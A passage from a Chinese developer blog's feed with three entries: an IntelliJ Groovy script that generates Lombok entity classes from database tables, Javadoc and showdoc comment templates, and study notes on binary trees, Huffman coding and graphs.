      <url>/2021/07/11/2021-07-11-Groovy%E8%84%9A%E6%9C%AC%E7%94%9F%E6%88%90%E5%B8%A6%E6%B3%A8%E9%87%8A%E7%9A%84%E5%AE%9E%E4%BD%93%E7%B1%BB/</url>
      
        <content type="html"><![CDATA[<center>出处忘了，之前自己编过一个，后来申请教育资格的时候，把原来的脚本忘了</center><span id="more"></span><p>大驼峰、小驼峰 loombock</p><pre class="line-numbers language-groovy" data-language="groovy"><code class="language-groovy"><span class="token keyword">import</span> com<span class="token punctuation">.</span>intellij<span class="token punctuation">.</span>database<span class="token punctuation">.</span>model<span class="token punctuation">.</span>DasTable<span class="token keyword">import</span> com<span class="token punctuation">.</span>intellij<span class="token punctuation">.</span>database<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Case<span class="token keyword">import</span> com<span class="token punctuation">.</span>intellij<span class="token punctuation">.</span>database<span class="token punctuation">.</span>util<span class="token punctuation">.</span>DasUtil<span class="token keyword">import</span> java<span class="token punctuation">.</span>text<span class="token punctuation">.</span>SimpleDateFormat<span class="token keyword">import</span> com<span class="token punctuation">.</span>intellij<span class="token punctuation">.</span>database<span class="token punctuation">.</span>model<span class="token punctuation">.</span>ObjectKind<span class="token comment">/* * Available context bindings: *   SELECTION   Iterable&lt;DasObject> *   PROJECT     project *   FILES       files helper */</span>packageName <span class="token operator">=</span> <span class="token string gstring">"com.sample;"</span><span class="token comment">//优先级</span>typeMapping <span class="token operator">=</span> <span class="token punctuation">[</span>        <span class="token punctuation">(</span><span class="token operator">~</span><span class="token string regex">/(?i)tinyint/</span><span class="token punctuation">)</span>                         <span class="token punctuation">:</span> <span class="token string gstring">"byte"</span><span class="token punctuation">,</span>        <span class="token punctuation">(</span><span class="token operator">~</span><span class="token string regex">/(?i)int/</span><span class="token punctuation">)</span>                             <span class="token punctuation">:</span> <span class="token string gstring">"Integer"</span><span class="token punctuation">,</span>        <span class="token punctuation">(</span><span class="token operator">~</span><span class="token string regex">/(?i)bool|bit/</span><span class="token punctuation">)</span>                        <span class="token punctuation">:</span> <span class="token string gstring">"Boolean"</span><span class="token punctuation">,</span>        <span class="token punctuation">(</span><span class="token operator">~</span><span class="token string regex">/(?i)float|double|decimal|real/</span><span class="token punctuation">)</span>       <span class="token punctuation">:</span> <span class="token string gstring">"Double"</span><span class="token punctuation">,</span>        <span class="token punctuation">(</span><span class="token operator">~</span><span class="token string regex">/(?i)timestamp/</span><span class="token punctuation">)</span>                       <span class="token punctuation">:</span> <span class="token string gstring">"Timestamp"</span><span class="token punctuation">,</span>        <span class="token punctuation">(</span><span class="token operator">~</span><span class="token string regex">/(?i)/</span><span class="token punctuation">)</span>                                <span class="token punctuation">:</span> <span class="token string gstring">"String"</span><span class="token punctuation">]</span>FILES<span class="token punctuation">.</span><span class="token function">chooseDirectoryAndSave</span><span class="token punctuation">(</span><span class="token string gstring">"Choose directory"</span><span class="token punctuation">,</span> <span class="token string gstring">"Choose where to store generated files"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> dir <span class="token operator">-></span>    SELECTION<span class="token punctuation">.</span>filter <span class="token punctuation">&#123;</span> it <span class="token keyword">instanceof</span> <span class="token class-name">DasTable</span> <span class="token punctuation">&#125;</span><span class="token punctuation">.</span>each <span class="token punctuation">&#123;</span> <span class="token function">generate</span><span class="token punctuation">(</span>it<span class="token punctuation">,</span> dir<span class="token punctuation">)</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">def</span> <span class="token function">generate</span><span class="token punctuation">(</span>table<span class="token punctuation">,</span> dir<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">def</span> className <span class="token operator">=</span> <span class="token function">javaName</span><span class="token punctuation">(</span>table<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> fields <span class="token operator">=</span> <span class="token function">calcFields</span><span class="token punctuation">(</span>table<span class="token punctuation">)</span>    packageName <span class="token operator">=</span> <span class="token function">getPackageName</span><span class="token punctuation">(</span>dir<span class="token punctuation">)</span>    <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span>dir<span class="token punctuation">,</span> className <span class="token operator">+</span> <span class="token string gstring">".java"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">withPrintWriter</span><span class="token punctuation">(</span><span class="token string gstring">"utf-8"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> out <span class="token operator">-></span> <span class="token function">generate</span><span class="token punctuation">(</span>out<span class="token punctuation">,</span> className<span class="token punctuation">,</span> fields<span class="token punctuation">,</span> table<span class="token punctuation">)</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">// 获取包所在文件夹路径</span><span class="token keyword">def</span> <span class="token function">getPackageName</span><span class="token punctuation">(</span>dir<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> dir<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replaceAll</span><span class="token punctuation">(</span><span class="token string gstring">"\\\\"</span><span class="token punctuation">,</span> <span class="token string gstring">"."</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replaceAll</span><span class="token punctuation">(</span><span class="token string gstring">"/"</span><span class="token punctuation">,</span> <span class="token string gstring">"."</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replaceAll</span><span class="token punctuation">(</span><span class="token string gstring">"^.*src(\\.main\\.java\\.)?"</span><span class="token punctuation">,</span> <span class="token string gstring">""</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string gstring">";"</span><span class="token punctuation">&#125;</span><span class="token keyword">def</span> <span class="token function">generate</span><span class="token punctuation">(</span>out<span class="token punctuation">,</span> className<span class="token punctuation">,</span> fields<span class="token punctuation">,</span> table<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    out<span class="token punctuation">.</span>println <span class="token string gstring">"package <span class="token expression"><span class="token punctuation">$</span>packageName</span>"</span>    out<span class="token punctuation">.</span>println <span class="token string gstring">""</span>    out<span class="token punctuation">.</span>println <span class="token string gstring">"import lombok.AllArgsConstructor;"</span>    out<span class="token punctuation">.</span>println <span class="token string gstring">"import lombok.Data;"</span>    out<span class="token punctuation">.</span>println <span class="token string gstring">"import lombok.NoArgsConstructor;"</span>    Set types <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashSet</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    fields<span class="token punctuation">.</span><span class="token function">each</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        types<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>it<span class="token punctuation">.</span>type<span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>types<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string gstring">"Timestamp"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        out<span class="token punctuation">.</span>println <span class="token string gstring">""</span>        out<span class="token punctuation">.</span>println <span class="token string gstring">"import java.sql.Timestamp;"</span>    <span class="token punctuation">&#125;</span>    out<span class="token punctuation">.</span>println <span class="token string gstring">""</span>    out<span class="token punctuation">.</span>println <span class="token string gstring">"/**"</span>    out<span class="token punctuation">.</span>println <span class="token string gstring">" * @author amorfati on "</span> <span class="token operator">+</span> <span class="token keyword">new</span> <span class="token class-name">SimpleDateFormat</span><span class="token punctuation">(</span><span class="token string gstring">"yyyy/MM/dd"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span><span class="token string gstring">"."</span>    out<span class="token punctuation">.</span>println <span class="token string gstring">" */"</span>    out<span class="token punctuation">.</span>println <span class="token string gstring">"@Data"</span>    out<span class="token punctuation">.</span>println <span class="token string gstring">"@AllArgsConstructor"</span>    out<span class="token punctuation">.</span>println <span class="token string gstring">"@NoArgsConstructor"</span>    out<span class="token punctuation">.</span>println <span class="token string gstring">"public class <span class="token expression"><span class="token punctuation">$</span>className</span> &#123;"</span>    out<span class="token punctuation">.</span>println <span class="token string gstring">""</span>    fields<span class="token punctuation">.</span><span class="token function">each</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// 输出注释</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isNotEmpty</span><span class="token punctuation">(</span>it<span class="token punctuation">.</span>commoent<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            out<span class="token punctuation">.</span>println <span class="token string gstring">"\t/**"</span>            out<span class="token punctuation">.</span>println <span class="token string gstring">" \t* <span class="token expression"><span class="token punctuation">$</span><span class="token punctuation">&#123;</span>it<span class="token punctuation">.</span>commoent<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span>"</span>            out<span class="token punctuation">.</span>println <span class="token string gstring">" \t*/"</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>it<span class="token punctuation">.</span>annos <span class="token operator">!=</span> <span class="token string gstring">""</span><span class="token punctuation">)</span> out<span class="token punctuation">.</span>println <span class="token string gstring">"  <span class="token expression"><span class="token punctuation">$</span><span class="token punctuation">&#123;</span>it<span class="token punctuation">.</span>annos<span class="token punctuation">&#125;</span></span>"</span>        out<span class="token punctuation">.</span>println <span class="token string gstring">"\tprivate <span class="token expression"><span class="token punctuation">$</span><span class="token punctuation">&#123;</span>it<span class="token punctuation">.</span>type<span class="token punctuation">&#125;</span></span> <span class="token expression"><span class="token punctuation">$</span><span class="token punctuation">&#123;</span>it<span class="token punctuation">.</span>name<span class="token punctuation">&#125;</span></span>;"</span>    <span class="token punctuation">&#125;</span>    out<span class="token punctuation">.</span>println <span class="token string gstring">""</span>    out<span class="token punctuation">.</span>println <span class="token string gstring">"&#125;"</span><span class="token punctuation">&#125;</span><span class="token keyword">def</span> <span class="token function">isNotEmpty</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> content <span class="token operator">!=</span> null <span class="token operator">&amp;&amp;</span> content<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token keyword">def</span> <span class="token function">calcFields</span><span class="token punctuation">(</span>table<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    DasUtil<span class="token punctuation">.</span><span class="token function">getColumns</span><span class="token punctuation">(</span>table<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">reduce</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> fields<span class="token punctuation">,</span> col <span class="token operator">-></span>        <span class="token keyword">def</span> spec <span class="token operator">=</span> Case<span class="token punctuation">.</span>LOWER<span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span>col<span class="token punctuation">.</span><span class="token function">getDataType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getSpecification</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">def</span> typeStr <span class="token operator">=</span> typeMapping<span class="token punctuation">.</span>find <span class="token punctuation">&#123;</span> p<span class="token punctuation">,</span> t <span class="token operator">-></span> p<span class="token punctuation">.</span><span class="token function">matcher</span><span class="token punctuation">(</span>spec<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span><span class="token punctuation">.</span>value        <span class="token keyword">def</span> comm <span class="token operator">=</span> <span class="token punctuation">[</span>                colName <span class="token punctuation">:</span> col<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                name    <span class="token punctuation">:</span> <span class="token function">javaName</span><span class="token punctuation">(</span>col<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                type    <span class="token punctuation">:</span> typeStr<span class="token punctuation">,</span>                commoent<span class="token punctuation">:</span> col<span class="token punctuation">.</span><span class="token function">getComment</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                annos   <span class="token punctuation">:</span> <span class="token string gstring">""</span>        <span class="token punctuation">]</span>        fields <span class="token operator">+=</span> <span class="token punctuation">[</span>comm<span class="token punctuation">]</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">def</span> <span class="token function">javaName</span><span class="token punctuation">(</span>str<span class="token punctuation">,</span> capitalize<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">def</span> s <span class="token operator">=</span> com<span class="token punctuation">.</span>intellij<span class="token punctuation">.</span>psi<span class="token punctuation">.</span>codeStyle<span class="token punctuation">.</span>NameUtil<span class="token punctuation">.</span><span class="token function">splitNameIntoWords</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span>            <span class="token punctuation">.</span>collect <span class="token punctuation">&#123;</span> Case<span class="token punctuation">.</span>LOWER<span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span>it<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">capitalize</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span>            <span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string gstring">""</span><span class="token punctuation">)</span>            <span class="token punctuation">.</span><span class="token function">replaceAll</span><span class="token punctuation">(</span><span class="token string regex">/[^\p&#123;javaJavaIdentifierPart&#125;[_]]/</span><span class="token punctuation">,</span> <span class="token string gstring">"_"</span><span class="token punctuation">)</span>    capitalize <span class="token operator">||</span> s<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token operator">?</span> s <span class="token punctuation">:</span> Case<span class="token punctuation">.</span>LOWER<span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> s<span class="token punctuation">[</span><span class="token number">1</span><span class="token operator">..</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Jetbrain </category>
          
      </categories>
      
      
        <tags>
            
            <tag> idea </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>注释模板</title>
      <link href="/2021/07/11/2021-07-11-%E6%B3%A8%E9%87%8A%E6%A8%A1%E6%9D%BF/"/>
      <url>/2021/07/11/2021-07-11-%E6%B3%A8%E9%87%8A%E6%A8%A1%E6%9D%BF/</url>
      
        <content type="html"><![CDATA[<center>教程来源比较杂，出处不明，自己摸索着改了一点</center><span id="more"></span><ul><li>javadoc</li></ul><p>平常用showdoc写文档，又懒得装软件，showdoc提供的脚本还是蛮方便的</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">*</span><span class="token operator">*</span> showdoc<span class="token operator">*</span> <span class="token annotation punctuation">@catalog</span> 测试文档<span class="token operator">/</span>用户相关    <span class="token operator">*</span> <span class="token annotation punctuation">@author</span> <span class="token operator">*</span> <span class="token annotation punctuation">@title</span> 用户注册<span class="token operator">*</span> <span class="token annotation punctuation">@description</span> 用户注册的接口    <span class="token operator">*</span> <span class="token annotation punctuation">@date</span> $date$ $time$$param$ $<span class="token keyword">return</span>$<span class="token operator">*</span> <span class="token annotation punctuation">@method</span> post<span class="token operator">*</span> <span class="token annotation punctuation">@url</span> <span class="token operator">*</span> <span class="token annotation punctuation">@param</span> username 必选 string 用户名  <span class="token operator">*</span> <span class="token annotation punctuation">@param</span> password 必选 string 密码  <span class="token operator">*</span> <span class="token annotation punctuation">@param</span> name 可选 string 用户昵称  <span class="token operator">*</span> <span class="token annotation punctuation">@return</span> <span class="token punctuation">&#123;</span><span class="token string">"error_code"</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">"data"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token string">"uid"</span><span class="token operator">:</span><span class="token string">"1"</span><span class="token punctuation">,</span><span class="token string">"username"</span><span class="token operator">:</span><span class="token string">"12154545"</span><span class="token punctuation">,</span><span class="token string">"name"</span><span class="token operator">:</span><span class="token string">"吴系挂"</span><span class="token punctuation">,</span><span class="token string">"groupid"</span><span class="token operator">:</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">"reg_time"</span><span class="token operator">:</span><span class="token string">"1436864169"</span><span class="token punctuation">,</span><span class="token string">"last_login_time"</span><span class="token operator">:</span><span class="token string">"0"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token operator">*</span> <span class="token annotation punctuation">@return_param</span> groupid <span class="token keyword">int</span> 用户组id<span class="token operator">*</span> <span class="token annotation punctuation">@return_param</span> name string 用户昵称<span class="token operator">*</span> <span class="token annotation punctuation">@remark</span> 这里是备注信息<span class="token operator">*</span><span class="token operator">/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>Class注释</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java">#<span class="token keyword">if</span> <span class="token punctuation">(</span>$<span class="token punctuation">&#123;</span>PACKAGE_NAME<span class="token punctuation">&#125;</span> <span class="token operator">&amp;&amp;</span> $<span class="token punctuation">&#123;</span>PACKAGE_NAME<span class="token punctuation">&#125;</span> <span class="token operator">!=</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token keyword">package</span> $<span class="token punctuation">&#123;</span>PACKAGE_NAME<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>#end#<span class="token function">parse</span><span class="token punctuation">(</span><span class="token string">"File Header.java"</span><span class="token punctuation">)</span><span class="token comment">/** * @author amorfati * @date $&#123;YEAR&#125;年$&#123;MONTH&#125;月$&#123;DAY&#125;日 $&#123;TIME&#125; */</span><span class="token keyword">public</span> <span class="token keyword">class</span> $<span class="token punctuation">&#123;</span>NAME<span class="token punctuation">&#125;</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>interface注释</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java">#<span class="token keyword">if</span> <span class="token punctuation">(</span>$<span class="token punctuation">&#123;</span>PACKAGE_NAME<span class="token punctuation">&#125;</span> <span class="token operator">&amp;&amp;</span> $<span class="token punctuation">&#123;</span>PACKAGE_NAME<span class="token punctuation">&#125;</span> <span class="token operator">!=</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token keyword">package</span> $<span class="token punctuation">&#123;</span>PACKAGE_NAME<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>#end#<span class="token function">parse</span><span class="token punctuation">(</span><span class="token string">"File Header.java"</span><span class="token punctuation">)</span><span class="token comment">/** * @author amorfati * @date $&#123;YEAR&#125;年$&#123;MONTH&#125;月$&#123;DAY&#125;日 $&#123;TIME&#125; */</span><span class="token keyword">public</span> <span class="token keyword">interface</span> $<span class="token punctuation">&#123;</span>NAME<span class="token punctuation">&#125;</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Jetbrain </category>
          
      </categories>
      
      
        <tags>
            
            <tag> idea </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>非线性结构</title>
      <link href="/2021/06/16/2021-06-13-%E9%9D%9E%E7%BA%BF%E6%80%A7%E7%BB%93%E6%9E%84/"/>
      <url>/2021/06/16/2021-06-13-%E9%9D%9E%E7%BA%BF%E6%80%A7%E7%BB%93%E6%9E%84/</url>
      
        <content type="html"><![CDATA[<center>二叉树、图</center><span id="more"></span><h1>树</h1><h2 id="基本概念">基本概念</h2><blockquote><p>树描述数据元素之间的层级关系</p></blockquote><ul><li><p>双亲、子女、边</p><ul><li>边：双亲到子女</li></ul></li><li><p>兄弟</p><blockquote><p>具有同一双亲结点</p></blockquote></li><li><p>路径、路径长度</p></li><li><p>结点的层数</p><blockquote><p>根节点的层数为0</p></blockquote></li><li><p>树的深度（高度）</p><blockquote><p>层数最大</p></blockquote></li><li><p>结点的度数、树的度数</p><ul><li>结点子女的个数称为该结点的“度数”</li><li>树中度数最大的结点的度数叫做“树的度数“</li></ul></li><li><p>树叶、分支结点</p></li><li><p>有序树、无序树</p></li><li><p>森林</p><blockquote><p>m棵互不相交的集合称为森林</p></blockquote></li></ul><h2 id="二叉树">二叉树</h2><blockquote><p>结点有左右之分</p></blockquote><ul><li><p>第i层，节点数目最多为2^i^</p></li><li><p>深度为k的二叉树至多有2^k+1^ - 1个结点</p></li><li><p>终端结点为n0、度数为2的结点个数为n2， n0 = n2 + 1</p></li><li><p>满二叉树</p></li></ul><blockquote><p>深度为k，且有2^k+1^ -1个结点</p></blockquote><ul><li>完全二叉树</li></ul><blockquote><p>不一定是满二叉树</p></blockquote><ul><li>具有n个结点的完全二叉树的深度为[logn]</li></ul><h3 id="二叉树的遍历">二叉树的遍历</h3><blockquote><p>D 根 L 左子树 R 右子树</p></blockquote><ul><li>先序遍历 DLR</li><li>中序遍历 LDR</li><li>后序遍历 LRD</li><li>层次遍历</li></ul><h3 id="转换">转换</h3><ul><li><p>树转二叉树</p><p><a href="https://imgtu.com/i/2X7ZZR"><img src="https://z3.ax1x.com/2021/06/16/2X7ZZR.png" alt="2X7ZZR.png"></a></p></li><li><p>森林转二叉树</p><p><a href="https://imgtu.com/i/2X7ui6"><img src="https://z3.ax1x.com/2021/06/16/2X7ui6.png" alt="2X7ui6.png"></a></p></li><li><p>二叉树到森林</p><p><a href="https://imgtu.com/i/2X7QzD"><img src="https://z3.ax1x.com/2021/06/16/2X7QzD.png" alt="2X7QzD.png"></a></p></li></ul><h3 id="哈夫曼树">哈夫曼树</h3><h4 id="基本概念-2">基本概念</h4><ul><li><p>扩充二叉树和带权路径长度</p><blockquote><p>带有权值的叶结点叫做扩充二叉树的外结点，其余的分结点叫做内结点</p></blockquote><p><a href="https://imgtu.com/i/2XHXEn"><img src="https://z3.ax1x.com/2021/06/16/2XHXEn.png" alt="2XHXEn.png"></a></p></li><li><p>最优二叉树</p><blockquote><p>WPL最小的称为最优二叉树</p></blockquote></li><li><p>哈夫曼树</p><blockquote><p>利用哈夫曼提出的方法构造出的最优二叉树</p></blockquote></li></ul><h4 id="哈夫曼树的构造">哈夫曼树的构造</h4><ol><li>给定n个权值，构造含有n棵扩充二叉树的森林F</li><li>结点的权值为<strong>最小</strong>和<strong>次小</strong>的两棵二叉树作为左右子树构造出新的二叉树，权值为二者之和</li><li>从森林中删去组称新二叉树的两颗树，</li><li>重复2. 3.</li></ol><p><a href="https://imgtu.com/i/2vZ9eJ"><img src="https://z3.ax1x.com/2021/06/17/2vZ9eJ.png" alt="2vZ9eJ.png"></a></p><h4 id="哈夫曼树的应用">哈夫曼树的应用</h4><ul><li><p>哈夫曼编码</p><blockquote><p>以上图为例</p></blockquote><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>C</mi><mo>=</mo><mo stretchy="false">{</mo><mi>A</mi><mo separator="true">,</mo><mi>B</mi><mo separator="true">,</mo><mi>C</mi><mo separator="true">,</mo><mi>D</mi><mo separator="true">,</mo><mi>E</mi><mo separator="true">,</mo><mi>F</mi><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">C = \{A, B, C, D , E, F\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord mathnormal">A</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mclose">}</span></span></span></span>对应的频度为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">{</mo><mn>6</mn><mo separator="true">,</mo><mn>2</mn><mo separator="true">,</mo><mn>3</mn><mo separator="true">,</mo><mn>3</mn><mo separator="true">,</mo><mn>4</mn><mo separator="true">,</mo><mn>9</mn><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">\{6,2,3,3,4,9\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord">6</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">2</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">3</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">3</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">4</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">9</span><span class="mclose">}</span></span></span></span></p><p>A = 01 B = 000 C = 001 D = 100 E = 101 F = 11</p><blockquote><p>左子女编码为0，右子女编码为1</p></blockquote></li></ul><h1>图</h1><blockquote><p>网状关系的数据结构，关系任意</p></blockquote><h2 id="图的概念">图的概念</h2><blockquote><p>形式上用二重组表示<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>G</mi><mo>=</mo><mo stretchy="false">(</mo><mi>V</mi><mo separator="true">,</mo><mi>E</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">G = (V, E)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;"></span><span class="mord mathnormal">G</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mclose">)</span></span></span></span> 